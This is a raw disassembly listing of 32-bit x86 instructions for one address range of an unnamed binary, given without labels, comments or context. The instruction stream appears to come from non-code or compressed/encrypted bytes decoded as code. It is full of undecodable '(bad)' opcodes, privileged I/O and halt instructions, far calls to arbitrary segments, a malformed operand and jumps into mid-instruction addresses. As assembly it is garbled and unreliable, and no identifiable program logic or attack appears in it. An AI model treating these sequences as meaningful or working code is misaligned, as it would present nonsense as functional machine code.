  40e65c:	xchg   DWORD PTR [ebp+0x68],ebp
  40e65f:	mov    ah,0x88
  40e661:	adc    BYTE PTR [esi],bh
  40e663:	jne    0x40e60a
  40e665:	adc    BYTE PTR [ecx],0x68
  40e668:	retf   0xbba
  40e66b:	pop    edx
  40e66c:	ret    
  40e66d:	pop    ebx
  40e66e:	mov    al,ds:0x568d40
  40e673:	imul   ebx,DWORD PTR [edx],0x2474d6ef
  40e679:	call   0x9845:0x668682c2
  40e680:	sub    al,0x7c
  40e682:	fcomp  QWORD PTR [ebp-0x32]
  40e685:	mov    ah,0x36
  40e687:	push   ss
  40e688:	mov    ch,0xf6
  40e68a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e68b:	sub    al,0x3a
  40e68d:	adc    ah,BYTE PTR [ecx+0x0]
  40e690:	or     ebp,DWORD PTR [esi]
  40e692:	mov    bl,0x16
  40e694:	pop    ebp
  40e695:	mov    WORD PTR [edx],es
  40e697:	and    al,BYTE PTR [ebp+ebp*8-0x6d]
  40e69b:	sbb    dh,BYTE PTR [eax-0x3adb3523]
  40e6a1:	mov    esi,0xd89ae6d8
  40e6a6:	sub    bh,BYTE PTR [edx]
  40e6a8:	ins    BYTE PTR es:[edi],dx
  40e6a9:	das    
  40e6aa:	xchg   esp,eax
  40e6ab:	pop    ds
  40e6ac:	cli    
  40e6ad:	shl    al,0x6c
  40e6b0:	xor    BYTE PTR [ebp+0x3eb204e1],al
  40e6b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6b7:	xchg   esp,eax
  40e6b8:	sbb    ch,0x92
  40e6bb:	sub    ecx,DWORD PTR [ebx+ebx*2]
  40e6be:	jae    0x40e650
  40e6c0:	lods   al,BYTE PTR ds:[esi]
  40e6c1:	mov    cl,0x46
  40e6c3:	ins    DWORD PTR es:[edi],dx
  40e6c4:	cmp    ebx,DWORD PTR [edx+ebx*4-0x65]
  40e6c8:	jmp    DWORD PTR [eax-0x479fc8da]
  40e6ce:	push   cs
  40e6cf:	mov    cs,WORD PTR ds:0x9541474
  40e6d5:	mov    dl,0x24
  40e6d7:	push   edi
  40e6d8:	xor    BYTE PTR ds:0xcd60e13c,bl
  40e6de:	xchg   BYTE PTR [edi],dl
  40e6e0:	inc    edx
  40e6e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6e2:	lods   eax,DWORD PTR ds:[esi]
  40e6e3:	add    BYTE PTR [ebx-0x38],al
  40e6e6:	xchg   ebp,eax
  40e6e7:	hlt    
  40e6e8:	sbb    esp,edx
  40e6ea:	fsub   DWORD PTR [ebp-0x58]
  40e6ed:	pop    edx
  40e6ee:	test   BYTE PTR [ecx+0x746fa81d],0x62
  40e6f5:	or     DWORD PTR [eax],ebp
  40e6f7:	sub    DWORD PTR [ebp+0x6e],0x3a3ae8aa
  40e6fe:	pop    ds
  40e6ff:	add    BYTE PTR [ecx+0x366a554f],cl
  40e705:	rol    DWORD PTR ds:0x846e4702,1
  40e70b:	mov    dl,0xc
  40e70d:	add    BYTE PTR cs:[edx],bl
  40e710:	es push esp
  40e712:	cdq    
  40e713:	das    
  40e714:	inc    eax
  40e715:	mov    ebx,0x8af916
  40e71a:	cmp    DWORD PTR [edi],ebp
  40e71c:	pusha  
  40e71d:	pop    ebp
  40e71e:	adc    ch,BYTE PTR [esi]
  40e720:	shl    DWORD PTR [esi-0x6a],1
  40e723:	xor    dh,BYTE PTR [eax+0x40]
  40e726:	dec    ebx
  40e727:	jle    0x40e756
  40e729:	add    eax,0xa4600be6
  40e72e:	sbb    al,0x33
  40e730:	cdq    
  40e731:	add    BYTE PTR [ecx+0x64],cl
  40e734:	shl    BYTE PTR [ecx+0x4368d4d],cl
  40e73a:	push   esp
  40e73b:	clc    
  40e73c:	ss shl bl,1
  40e73f:	test   eax,0x1fe6056
  40e744:	add    ah,bh
  40e746:	fadd   DWORD PTR [eax]
  40e748:	push   ebx
  40e749:	xor    BYTE PTR [edx-0x4c],al
  40e74c:	retf   0xd78
  40e74f:	sbb    eax,0xf922d04d
  40e754:	cld    
  40e755:	jl     0x40e790
  40e757:	fadd   DWORD PTR [edi+0x7a]
  40e75a:	pop    ebx
  40e75b:	outs   dx,DWORD PTR ds:[esi]
  40e75c:	adc    eax,0xe6ae5505
  40e761:	(bad)  
  40e762:	sub    esp,eax
  40e764:	ret    
  40e765:	mov    cs,eax
  40e767:	pop    es
  40e768:	add    BYTE PTR [edx-0x7e],bh
  40e76b:	pop    ebx
  40e76c:	xrelease xchg BYTE PTR [esi+eiz*8-0x959ff0e],cl
  40e774:	sar    edx,0xcb
  40e777:	add    BYTE PTR [edx-0xfa7d76a],al
  40e77d:	stos   BYTE PTR es:[edi],al
  40e77e:	push   0xffffff84
  40e780:	rol    DWORD PTR [bx+si],cl
  40e783:	mov    esp,0xb4c69d24
  40e788:	in     eax,dx
  40e789:	loop   0x40e78b
  40e78b:	pop    edx
  40e78c:	in     al,0x72
  40e78e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e78f:	dec    esi
  40e790:	enter  0xb128,0xbe
  40e794:	mov    DWORD PTR [esi+0x523210e2],esp
  40e79a:	int    0xc6
  40e79c:	imul   BYTE PTR [edx]
  40e79e:	or     ebp,DWORD PTR [edx+0x555cba0a]
  40e7a4:	cld    
  40e7a5:	push   ecx
  40e7a6:	mov    edx,0x4ad4c685
  40e7ab:	mov    al,ds:0x7c64f1ca
  40e7b0:	push   edx
  40e7b1:	pop    edi
  40e7b2:	xor    BYTE PTR [edx],ch
  40e7b4:	jne    0x40e783
  40e7b6:	les    eax,FWORD PTR [edi-0x723fd54f]
  40e7bc:	inc    esp
  40e7bd:	cdq    
  40e7be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7bf:	out    dx,eax
  40e7c0:	xchg   DWORD PTR [edx],ecx
  40e7c2:	pop    ebx
  40e7c3:	popa   
  40e7c4:	pop    eax
  40e7c5:	jo     0x40e81b
  40e7c7:	cli    
  40e7c8:	pop    esi
  40e7c9:	or     cl,BYTE PTR [eax]
  40e7cb:	mov    al,0xab
  40e7cd:	sub    BYTE PTR [edx],ch
  40e7cf:	push   0x315447f4
  40e7d4:	add    ch,BYTE PTR [eax-0x1e]
  40e7d7:	neg    DWORD PTR [esi+0x77]
  40e7da:	loop   0x40e7dd
  40e7dc:	ins    DWORD PTR es:[edi],dx
  40e7dd:	mov    edi,0x683a2b
  40e7e2:	jmp    0x40e7b2
  40e7e4:	mov    ecx,0x50050500
  40e7e9:	sbb    BYTE PTR ds:0x34679fba,0xf1
  40e7f0:	sub    al,BYTE PTR [edx]
  40e7f2:	adc    DWORD PTR [edx],ebp
  40e7f4:	fcmove st,st(4)
  40e7f6:	inc    esi
  40e7f7:	pop    edx
  40e7f8:	push   edx
  40e7f9:	call   0x551cd82e
  40e7fe:	push   eax
  40e7ff:	sub    BYTE PTR [ebp+0x2f4ef404],0x4c
  40e806:	mov    edx,DWORD PTR [esp+edx*4]
  40e809:	jmp    0x40e875
  40e80b:	(bad)  
  40e80c:	ss loop 0x40e798
  40e80f:	adc    BYTE PTR [eax],ch
  40e811:	ret    0x410
  40e814:	out    dx,eax
  40e815:	and    BYTE PTR [eax],bh
  40e817:	jbe    0x40e7f1
  40e819:	sub    BYTE PTR [edi],0x62
  40e81c:	inc    edi
  40e81d:	push   ss
  40e81e:	inc    BYTE PTR [edi-0x6bc688be]
  40e824:	sahf   
  40e825:	mov    DWORD PTR [esi+0x3afe6a55],esi
  40e82b:	jnp    0x40e84d
  40e82d:	(bad)  
  40e82e:	scas   al,BYTE PTR es:[edi]
  40e82f:	dec    edx
  40e830:	or     edx,eax
  40e832:	cmp    ebp,DWORD PTR fs:[edx]
  40e835:	ss (bad) 
  40e837:	push   esp
  40e838:	cmc    
  40e839:	or     esi,DWORD PTR [edx-0x579062a2]
  40e83f:	pop    eax
  40e840:	push   esp
  40e841:	xor    ch,bh
  40e843:	fld    DWORD PTR ds:[edx+edx*2+0x3c380b]
  40e84b:	push   ss
  40e84c:	pop    es
  40e84d:	or     BYTE PTR [edx+0x2d],dh
  40e850:	xor    ah,cl
  40e852:	xor    ax,dx
  40e855:	shr    BYTE PTR [ecx+eax*4-0x58],1
  40e859:	pop    edx
  40e85a:	test   eax,0xd0cd182c
  40e85f:	loop   0x40e877
  40e861:	lahf   
  40e862:	push   esi
  40e863:	rcl    DWORD PTR [eax+0x50],1
  40e866:	fcom   DWORD PTR [eax]
  40e868:	imul   BYTE PTR [esi]
  40e86a:	outs   dx,BYTE PTR ds:[esi]
  40e86b:	(bad)  
  40e86c:	xchg   esp,eax
  40e86d:	(bad)
  40e870:	add    BYTE PTR ds:0xa8e64087,0x3b
  40e877:	fimul  DWORD PTR [edx+ecx*4+0x5]
  40e87b:	mov    ds:0xdc4386ad,al
  40e880:	jb     0x40e8d0
  40e882:	clc    
  40e883:	push   esp
  40e884:	mov    dl,0xab
  40e886:	xor    BYTE PTR [eax],dl
  40e888:	add    BYTE PTR [edx+0x6d],dl
  40e88b:	mov    esi,0x30001a26
  40e890:	push   ebp
  40e891:	push   ebp
  40e892:	xchg   ecx,eax
  40e893:	sub    eax,0xbe631a90
  40e898:	xchg   edx,eax
  40e899:	addr16 test al,0xa0
  40e89c:	sbb    BYTE PTR [ebp+0x6d],cl
  40e89f:	inc    ebp
  40e8a0:	inc    edi
  40e8a1:	push   ecx
  40e8a2:	xor    edx,DWORD PTR ss:[eax]
  40e8a5:	cmp    eax,0x823d2213
  40e8aa:	sbb    al,0xcd
  40e8ac:	out    dx,eax
  40e8ad:	ficomp DWORD PTR [esp+esi*4]
  40e8b0:	jl     0x40e8c5
  40e8b2:	xchg   BYTE PTR [eax-0x7ae8ff8d],bl
  40e8b8:	add    BYTE PTR [eax],bh
  40e8ba:	nop
  40e8bb:	popa   
  40e8bc:	inc    edx
  40e8bd:	push   ebx
  40e8be:	mov    edx,DWORD PTR [edx]
  40e8c0:	mov    bl,0x19
  40e8c2:	mov    al,ds:0x50692fd
  40e8c7:	and    BYTE PTR [eax+0x10],bl
  40e8ca:	add    DWORD PTR [eax-0x52],esp
  40e8cd:	push   es
  40e8ce:	xchg   edx,eax
  40e8cf:	push   cs
  40e8d0:	inc    ebp
  40e8d1:	aad    0x86
  40e8d3:	sbb    BYTE PTR [esi+0x26a8497a],al
  40e8d9:	sub    BYTE PTR [esi-0x4bf2bd4c],0xb
  40e8e0:	(bad)  
  40e8e1:	rol    al,1
  40e8e3:	out    dx,al
  40e8e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8e5:	imul   ebx,DWORD PTR [esi-0x2929fa60],0xdae49a9a
  40e8ef:	js     0x40e911
  40e8f1:	nop
  40e8f2:	and    eax,0x3c3a3628
  40e8f7:	sub    eax,0x6c5afb80
  40e8fc:	mov    bl,0x76
  40e8fe:	push   esp
  40e8ff:	int3   
  40e900:	mov    dl,0xe
  40e902:	mov    ds:0xb27003c4,eax
  40e907:	das    
  40e908:	mov    al,0xbe
  40e90a:	in     eax,0x58
  40e90c:	rcl    ebp,1
  40e90e:	xchg   esp,eax
  40e90f:	iret   
  40e910:	outs   dx,BYTE PTR ds:[esi]
  40e911:	paddusb mm6,QWORD PTR ds:0x2051b497
  40e918:	mov    al,ds:0x568caad4
  40e91d:	fcomp  DWORD PTR [edx]
  40e91f:	or     BYTE PTR [edx+ebp*4+0x34a3d2d6],cl
  40e926:	pop    eax
  40e927:	mov    dh,BYTE PTR [ecx+0x8]
  40e92a:	adc    DWORD PTR [ecx-0x42],esp
  40e92d:	jne    0x40e995
  40e92f:	or     BYTE PTR [esi-0x66ff4d69],0x51
  40e936:	clc    
  40e937:	push   ss
  40e938:	test   al,0x89
  40e93a:	add    dl,BYTE PTR [eax+0x1fe45e21]
  40e940:	aas    
  40e941:	lock sub al,0xfc
  40e944:	adc    al,0xfe
  40e946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e947:	sbb    DWORD PTR [esi],ebx
  40e949:	sti    
  40e94a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e94b:	or     al,BYTE PTR [ecx+0x5b]
  40e94e:	add    BYTE PTR [ebx+0x3e],bh
  40e951:	sbb    dh,0x78
  40e954:	jo     0x40e9be
  40e956:	adc    dh,dl
  40e958:	and    al,0x6b
  40e95a:	int    0x12
  40e95c:	sub    BYTE PTR [ebp-0x78],al
  40e95f:	fsubr  QWORD PTR [esp+eax*8-0x17121110]
  40e966:	stos   BYTE PTR es:[edi],al
  40e967:	mov    al,0xf
  40e969:	pop    esi
  40e96a:	and    cl,BYTE PTR [eax+0x799c8d4a]
  40e970:	aaa    
  40e971:	(bad)
  40e975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e976:	cmp    BYTE PTR [eax],dl
  40e978:	neg    bh
  40e97a:	les    edi,FWORD PTR [edi]
  40e97c:	rol    DWORD PTR [esi],0xf3
  40e97f:	outs   dx,DWORD PTR ds:[esi]
  40e980:	push   edx
  40e981:	dec    ebp
  40e982:	dec    eax
  40e983:	add    BYTE PTR [ebx-0x5822ffc8],bh
  40e989:	stos   BYTE PTR es:[edi],al
  40e98a:	add    al,0xc
  40e98c:	sbb    BYTE PTR [ebx+0x7a06d47a],al
  40e992:	outs   dx,DWORD PTR ds:[esi]
  40e993:	xchg   ebp,eax
  40e994:	and    al,0xb
  40e996:	or     ebx,DWORD PTR fs:[edx+0x33]
  40e99a:	push   ss
  40e99b:	loop   0x40e97f
  40e99d:	(bad)  
  40e99e:	loop   0x40e9a0
  40e9a0:	mov    cl,0x4c
  40e9a2:	push   ss
  40e9a3:	pop    edx
  40e9a4:	or     BYTE PTR [esi],0x5b
  40e9a7:	push   eax
  40e9a8:	call   0x1ccb35ce
  40e9ad:	sub    dh,al
  40e9af:	mov    bh,0x55
  40e9b1:	push   ecx
  40e9b2:	push   eax
  40e9b3:	and    al,0x8c
  40e9b5:	je     0x40ea11
  40e9b7:	rcl    BYTE PTR [ebx],cl
  40e9b9:	sbb    al,0x56
  40e9bb:	or     bl,BYTE PTR [edx-0x2fe357a3]
  40e9c1:	mov    esi,0xf0513aca
  40e9c6:	inc    edi
  40e9c7:	ins    DWORD PTR es:[edi],dx
  40e9c8:	in     eax,dx
  40e9c9:	nop
  40e9ca:	fsub   DWORD PTR [eax+0x49162a92]
  40e9d0:	cmp    dh,BYTE PTR [edx]
  40e9d2:	mov    eax,cs:0x699b104d
  40e9d8:	jae    0x40e984
  40e9da:	call   0xfaa4f4b3
  40e9df:	mov    ch,0xd4
  40e9e1:	push   ecx
  40e9e2:	push   eax
  40e9e3:	mov    cl,0xe0
  40e9e5:	cmp    BYTE PTR [ebx],dl
  40e9e7:	pusha  
  40e9e8:	fs push edx
  40e9ea:	cs in  al,dx
  40e9ec:	pop    edx
  40e9ed:	ins    BYTE PTR es:[edi],dx
  40e9ee:	xor    al,0x3a
  40e9f0:	add    al,0x8f
  40e9f2:	sub    BYTE PTR [edi+0x34],bh
  40e9f5:	adc    ch,BYTE PTR [ebx+eiz*1+0x26]
  40e9f9:	and    eax,0x30b2a051
  40e9fe:	dec    edi
  40e9ff:	mov    WORD PTR [eax-0x717e76ec],cs
  40ea05:	test   DWORD PTR [eax-0x7],ecx
  40ea08:	repnz or BYTE PTR [esi+esi*2],al
  40ea0c:	xor    al,0x14
  40ea0e:	je     0x40ea00
  40ea10:	cmc    
  40ea11:	mov    ds:0x3c615091,al
  40ea16:	out    dx,al
  40ea17:	mov    ch,0x92
  40ea19:	test   BYTE PTR [ebp+0x50d0f216],bh
  40ea1f:	bound  eax,QWORD PTR cs:[ebx+0x43]
  40ea23:	xchg   ebx,eax
  40ea24:	adc    al,0xa0
  40ea26:	lds    ebx,FWORD PTR [ebp+edx*1+0x7a]
  40ea2a:	nop
  40ea2b:	fst    DWORD PTR [esi-0x4c]
  40ea2e:	xchg   BYTE PTR [ebx],al
  40ea30:	jb     0x40ea80
  40ea32:	adc    al,0x78
  40ea34:	fdiv   QWORD PTR [eax-0x12]
  40ea37:	push   esp
  40ea38:	xlat   BYTE PTR ds:[ebx]
  40ea39:	mov    al,ds:0xfac0a2b6
  40ea3e:	xor    BYTE PTR [ecx-0x29d1911e],bl
  40ea44:	(bad)  [edx-0x2b0bd8f2]
  40ea4a:	xor    al,0xf8
  40ea4c:	js     0x40e9ed
  40ea4e:	loopne 0x40ea17
  40ea50:	mov    ah,BYTE PTR [edx+0x65e2e38a]
  40ea56:	push   esi
  40ea57:	addr16 adc bh,dl
  40ea5a:	jb     0x40ea74
  40ea5c:	adc    eax,0x1a460705
  40ea61:	mov    WORD PTR [ecx-0x650b89a0],es
  40ea67:	mov    dl,0x55
  40ea69:	push   ebp
  40ea6a:	sbb    eax,0x899c5148
  40ea6f:	xor    bl,al
  40ea71:	call   0x4668:0xeb501488
  40ea78:	inc    ebp
  40ea79:	dec    esi
  40ea7a:	adc    bh,BYTE PTR [edx]
  40ea7c:	jns    0x40eada
  40ea7e:	mov    ds:0xf28a8ad0,eax
  40ea83:	push   ds
  40ea84:	loopne 0x40ea45
  40ea86:	cmp    ah,0x70
  40ea89:	xor    al,0x56
  40ea8b:	adc    eax,0x66108834
  40ea90:	mov    dl,0xa2
  40ea92:	pusha  
  40ea93:	out    dx,al
  40ea94:	mov    eax,ds:0xfaab62
  40ea99:	jmp    0xbb87bcb6
  40ea9e:	pop    ecx
  40ea9f:	jo     0x40ea41
  40eaa1:	fmul   DWORD PTR [edi]
  40eaa3:	pusha  
  40eaa4:	xchg   ecx,eax
  40eaa5:	inc    esp
  40eaa6:	and    BYTE PTR [esp+eax*4-0x3e],cl
  40eaaa:	xlat   BYTE PTR ds:[ebx]
  40eaab:	loop   0x40eb23
  40eaad:	retf   0x1576
  40eab0:	xor    al,0x62
  40eab2:	lock push ds
  40eab4:	inc    esi
  40eab5:	clc    
  40eab6:	jmp    0xa3a2:0xadb47674
  40eabd:	adc    dl,BYTE PTR [edx+esi*2-0x2f6cddcf]
  40eac4:	push   0xffffffdd
  40eac6:	cs into 
  40eac8:	sub    al,0x28
  40eaca:	sub    BYTE PTR [eax+0x58],dl
  40eacd:	(bad)  
  40eace:	or     BYTE PTR [eax+0x1],bh
  40ead1:	lock xchg BYTE PTR [edi+0x49],cl
  40ead5:	test   eax,0xdbf455a3
  40eada:	jl     0x40ea5f
  40eadc:	js     0x40ea7b
  40eade:	int3   
  40eadf:	out    0xbf,al
  40eae1:	ror    DWORD PTR [esi],0x8c
  40eae4:	cmp    al,0x0
  40eae6:	adc    ebx,0xc9c700
  40eaec:	lods   al,BYTE PTR ds:[esi]
  40eaed:	xor    ah,BYTE PTR [edi-0x53]
  40eaf0:	sub    DWORD PTR [ebx+edx*1],esp
  40eaf3:	sbb    ah,BYTE PTR [edx+eiz*1-0x10]
  40eaf7:	mov    fs,eax
  40eaf9:	call   0x2275:0x98454dae
  40eb00:	pushf  
  40eb01:	or     DWORD PTR [edx+0x2e],0x75147698
  40eb08:	test   al,0xcc
  40eb0a:	ins    BYTE PTR es:[edi],dx
  40eb0b:	jp     0x40eb1b
  40eb0d:	adc    DWORD PTR [esi-0x67c9bc93],ebp
  40eb13:	push   ss
  40eb14:	sbb    DWORD PTR [esi+0x1c1e2702],eax
  40eb1a:	mov    esp,0x24f825d3
  40eb1f:	(bad)  
  40eb21:	jbe    0x40eba0
  40eb23:	outs   dx,BYTE PTR ds:[esi]
  40eb24:	xchg   DWORD PTR [eax],eax
  40eb26:	icebp  
  40eb27:	xchg   edx,eax
  40eb28:	jbe    0x40eb3b
  40eb2a:	ins    BYTE PTR es:[edi],dx
  40eb2b:	xchg   ebx,eax
  40eb2c:	mov    al,ds:0x6689260a
  40eb31:	mov    eax,0x1bacfc88
  40eb36:	ror    BYTE PTR [edx-0x411ebf2a],0x3e
  40eb3d:	sub    BYTE PTR [edx-0x2a],al
  40eb40:	ins    DWORD PTR es:[edi],dx
  40eb41:	lods   eax,DWORD PTR ds:[esi]
  40eb42:	rcr    BYTE PTR [esi-0xe],0x8a
  40eb46:	daa    
  40eb47:	sub    ah,BYTE PTR cs:[ecx]
  40eb4a:	push   ss
  40eb4b:	xchg   edi,eax
  40eb4c:	mov    ch,al
  40eb4e:	jno    0x40eb3a
  40eb50:	call   0x8f1afbff
  40eb55:	sbb    edi,DWORD PTR [eax]
  40eb57:	imul   edx,DWORD PTR [esi+0x2d30ad7d],0x927ec0aa
  40eb61:	cmp    cl,BYTE PTR [eax]
  40eb63:	es push edx
  40eb65:	push   ebp
  40eb66:	out    dx,al
  40eb67:	loop   0x40eaf0
  40eb69:	ret    0x6c63
  40eb6c:	add    al,0x18
  40eb6e:	outs   dx,BYTE PTR ds:[esi]
  40eb6f:	clc    
  40eb70:	push   esi
  40eb71:	add    BYTE PTR [edi+0x64],bl
  40eb74:	ins    BYTE PTR es:[edi],dx
  40eb75:	push   esi
  40eb76:	mov    al,0x1c
  40eb78:	js     0x40eb97
  40eb7a:	int3   
  40eb7b:	jl     0x40ebbd
  40eb7d:	mov    al,ds:0x4345d98d
  40eb82:	pop    ebx
  40eb83:	lock in al,0x1d
  40eb86:	dec    esi
  40eb87:	adc    BYTE PTR [esp+eax*8-0x1],cl
  40eb8b:	enter  0x94c4,0x81
  40eb8f:	jns    0x40eb58
  40eb91:	push   es
  40eb92:	sub    al,0xff
  40eb94:	(bad)  
  40eb96:	sub    al,0x0
  40eb98:	cld    
  40eb99:	stc    
  40eb9a:	sub    ch,BYTE PTR [eax+eiz*2-0x3308bebb]
  40eba1:	ins    BYTE PTR es:[edi],dx
  40eba2:	push   0xffffffaa
  40eba4:	adc    eax,0x1b0ab3f6
  40eba9:	call   0xfe5e:0x58600ade
  40ebb0:	mov    esp,0x57226b00
  40ebb5:	loopne 0x40ec1c
  40ebb7:	add    eax,0xd76cd158
  40ebbc:	add    dh,bl
  40ebbe:	in     al,dx
  40ebbf:	test   ecx,ebp
  40ebc1:	call   0xb39f733c
  40ebc6:	out    dx,eax
  40ebc7:	adc    eax,0x3401e8ad
  40ebcc:	jecxz  0x40ec0c
  40ebce:	fistp  QWORD PTR [esi+0x6822c4d0]
  40ebd4:	dec    ebp
  40ebd5:	mov    dh,0x0
  40ebd7:	xchg   esp,eax
  40ebd8:	sub    DWORD PTR [esi+ebx*2-0x1e],eax
  40ebdc:	mov    ds:0x415aad4c,al
  40ebe1:	sbb    DWORD PTR [eax-0x5789e1a6],0xab35d6b9
  40ebeb:	xor    eax,0x176c0351
  40ebf0:	sahf   
  40ebf1:	call   0x5f9a:0xa35d3a96
  40ebf8:	mov    ah,0xaa
  40ebfa:	or     eax,0x745ceb
  40ebff:	jae    0x40ec07
  40ec01:	add    bl,ch
  40ec03:	push   esp
  40ec04:	or     al,0xa2
  40ec06:	mov    al,ds:0xab240ed9
  40ec0b:	ret    
  40ec0c:	dec    esp
  40ec0d:	inc    esi
  40ec0e:	clc    
  40ec0f:	adc    dh,ah
  40ec11:	mov    eax,ds:0x4ca1a2ad
  40ec16:	std    
  40ec17:	dec    BYTE PTR [edi-0x20d7ebf0]
  40ec1d:	in     al,0xfc
  40ec1f:	or     ecx,DWORD PTR [edx]
  40ec21:	mov    ss,WORD PTR [eax]
  40ec23:	sbb    DWORD PTR [edx],edx
  40ec25:	loopne 0x40ec17
  40ec27:	pop    ecx
  40ec28:	loope  0x40ec2a
  40ec2a:	pusha  
  40ec2b:	inc    esp
  40ec2c:	add    cl,bl
  40ec2e:	push   eax
  40ec2f:	push   ebp
  40ec30:	push   ebp
  40ec31:	mov    dh,0xc0
  40ec33:	dec    eax
  40ec34:	mov    ebx,0x204e9a73
  40ec39:	cmp    al,0x87
  40ec3b:	push   esi
  40ec3c:	icebp  
  40ec3d:	mov    es,WORD PTR ds:0xea9bac96
  40ec43:	lahf   
  40ec44:	add    BYTE PTR [eax+0x5842406b],dh
  40ec4a:	inc    ecx
  40ec4b:	ficom  DWORD PTR [edx+0x5]
  40ec4e:	ficom  WORD PTR [edi+0x1b]
  40ec51:	cmp    al,0xa4
  40ec53:	sahf   
  40ec54:	mov    al,0xc1
  40ec56:	icebp  
  40ec57:	mov    esp,0x80722273
  40ec5c:	das    
  40ec5d:	out    0xe,al
  40ec5f:	jg     0x40ecb7
  40ec61:	fs fwait
  40ec63:	sbb    bh,dh
  40ec65:	jo     0x40eca7
  40ec67:	adc    ah,bl
  40ec69:	call   0x6a1d:0xf4346e
  40ec70:	mov    ch,0xe6
  40ec72:	inc    esi
  40ec73:	loop   0x40ec4b
  40ec75:	pusha  
  40ec76:	cmp    edx,esp
  40ec78:	shl    DWORD PTR [eax-0x42],1
  40ec7b:	push   0x4b
  40ec7d:	add    al,BYTE PTR [eax]
  40ec7f:	mov    eax,ds:0xa81c3296
  40ec84:	mov    DWORD PTR [edx+0x6251d868],ebx
  40ec8a:	mov    cl,0x84
  40ec8c:	int    0x94
  40ec8e:	loopne 0x40eccb
  40ec90:	lods   eax,DWORD PTR ds:[esi]
  40ec91:	loope  0x40ece3
  40ec93:	xor    BYTE PTR [eax],dh
  40ec95:	out    0xaa,al
  40ec97:	fimul  DWORD PTR [ecx+0x64]
  40ec9a:	in     eax,0x70
  40ec9c:	add    eax,0xf2805d6d
  40eca1:	xor    al,0x26
  40eca3:	popa   
  40eca4:	sbb    al,0x28
  40eca6:	mov    dh,0x86
  40eca8:	add    bl,bl
  40ecaa:	loopne 0x40ecfc
  40ecac:	jo     0x40ecb2
  40ecae:	add    BYTE PTR [eax-0x78ff6e6],al
  40ecb4:	ja     0x40ec77
  40ecb6:	mov    ch,0x16
  40ecb8:	cmp    DWORD PTR [eax-0x8],ecx
  40ecbb:	and    bh,0x46
  40ecbe:	retf   
  40ecbf:	pushf  
  40ecc0:	xor    eax,0xff6bd0db
  40ecc5:	dec    esp
  40ecc6:	iret   
  40ecc7:	cmp    eax,0x70fa122c
  40eccc:	and    bl,bl
  40ecce:	sub    BYTE PTR [eax+0xa],dl
  40ecd1:	lods   eax,DWORD PTR ds:[esi]
  40ecd2:	sbb    al,0xe2
  40ecd4:	mov    BYTE PTR [esi],al
  40ecd6:	cld    
  40ecd7:	nop
  40ecd8:	rcl    BYTE PTR [edx+0x15],cl
  40ecdb:	in     al,dx
  40ecdc:	sub    dl,dl
  40ecde:	cmc    
  40ecdf:	shl    DWORD PTR es:[eax],1
  40ece2:	data16 (bad) 
  40ece4:	xor    BYTE PTR [eax],dh
  40ece6:	inc    eax
  40ece7:	jmp    0x40ecd1
  40ece9:	xchg   BYTE PTR [esi],bl
  40eceb:	jb     0x40ecf4
  40eced:	inc    eax
  40ecee:	dec    esp
  40ecef:	cmp    cl,BYTE PTR [edx-0x75d8f97a]
  40ecf5:	loopne 0x40ed04
  40ecf7:	enter  0x5888,0x61
  40ecfb:	cmp    DWORD PTR [ecx-0x3f],0xde90ccfa
  40ed02:	add    BYTE PTR [esi+0x5],ah
  40ed05:	mov    edx,0xd15466b6
  40ed0a:	pop    edx
  40ed0b:	sub    DWORD PTR [edx+edx*1],0x469d0ad9
  40ed12:	mov    eax,0x5e685da6
  40ed17:	gs fcmove st,st(2)
  40ed1a:	addr16 jg 0x40ed93
  40ed1d:	and    al,0xab
  40ed1f:	pop    es
  40ed20:	add    al,dh
  40ed22:	std    
  40ed23:	push   ebx
  40ed24:	xchg   ebp,eax
  40ed25:	mov    al,ds:0x905e7a0a
  40ed2a:	jb     0x40ed49
  40ed2c:	pop    esi
  40ed2d:	ss adc al,0x15
  40ed30:	fdiv   DWORD PTR [edx]
  40ed32:	retf   0xd5b4
  40ed35:	push   cs
  40ed36:	xor    bh,BYTE PTR [edx-0x73]
  40ed39:	dec    edx
  40ed3a:	and    al,0x86
  40ed3c:	cmp    BYTE PTR ss:[esp+ebp*1],cl
  40ed40:	inc    edx
  40ed41:	jne    0x40ece1
  40ed43:	xchg   ecx,eax
  40ed44:	push   0x33
  40ed46:	xor    edx,DWORD PTR [esi-0x1cad8f54]
  40ed4c:	pusha  
  40ed4d:	push   eax
  40ed4e:	push   0x50
  40ed50:	xchg   edi,eax
  40ed51:	push   0xfffffffb
  40ed53:	and    ebp,DWORD PTR [eax+0x5c6ec3e0]
  40ed59:	inc    ebx
  40ed5a:	add    edx,eax
  40ed5c:	and    al,0x68
  40ed5e:	pop    esi
  40ed5f:	neg    BYTE PTR [esi-0x30]
  40ed62:	repnz adc eax,0x345ba6d9
  40ed68:	call   0xe8e4ed98
  40ed6d:	mov    ecx,0xefe652af
  40ed72:	dec    ebp
  40ed73:	and    eax,0xb4dc3515
  40ed78:	je     0x40ecfb
  40ed7a:	call   0x1fe0:0x67bd
  40ed80:	mov    DWORD PTR [edi+0x54],edx
  40ed83:	sbb    eax,0x105e00fe
  40ed88:	hlt    
  40ed89:	mov    DWORD PTR ss:[edx+0x31f09aaa],0xa26fb7d8
  40ed94:	mov    esi,0xa8441b45
  40ed99:	or     DWORD PTR [ecx],eax
  40ed9b:	sbb    al,0xe8
  40ed9d:	or     ch,0x16
  40eda0:	inc    eax
  40eda1:	dec    edx
  40eda2:	push   0xffffff8b
  40eda4:	int    0x64
  40eda6:	mov    ss,WORD PTR [esp+eiz*2-0x5f]
  40edaa:	enter  0x5054,0x64
  40edae:	test   dh,0xad
  40edb1:	mov    BYTE PTR [esi+0x5542b443],dh
  40edb7:	mov    ch,0x92
  40edb9:	pop    eax
  40edba:	mov    ?,esi
  40edbc:	xor    edx,edx
  40edbe:	hlt    
  40edbf:	aad    0xe0
  40edc1:	push   edx
  40edc2:	jae    0x40ee30
  40edc4:	push   esi
  40edc5:	mov    dh,0x32
  40edc7:	push   ss
  40edc8:	hlt    
  40edc9:	dec    ecx
